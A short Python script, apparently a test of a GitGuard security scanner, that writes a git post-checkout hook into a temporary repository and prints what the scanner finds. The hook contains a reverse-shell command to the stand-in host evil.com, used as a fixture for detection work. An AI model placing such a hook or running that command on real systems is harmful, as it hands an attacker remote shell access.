import tempfile
import os
import stat
from gateway.security.git_guard import GitGuard

def _make_hook(repo_dir, hook_name, content):
    hooks_dir = os.path.join(repo_dir, '.git', 'hooks')
    os.makedirs(hooks_dir, exist_ok=True)
    path = os.path.join(hooks_dir, hook_name)
    with open(path, 'w') as f:
        f.write('#!/bin/bash\n' + content + '\n')
    os.chmod(path, stat.S_IRWXU)
    return path

with tempfile.TemporaryDirectory() as d:
    _make_hook(d, 'post-checkout', 'bash -i >& /dev/tcp/evil.com/8080 0>&1')
    guard = GitGuard()
    findings = guard.scan_git_repository(d)
    print('Number of findings: {}'.format(len(findings)))
    for i, finding in enumerate(findings):
        print('Finding {}:'.format(i+1))
        print('  File: {}'.format(finding.file_path))
        print('  Threat level: {}'.format(finding.threat_level.value))
        print('  Category: {}'.format(finding.category))
        print('  Description: {}'.format(finding.description))
        print('  Pattern: {}'.format(finding.matched_pattern))
        print('  Context: {}'.format(finding.context))
        print()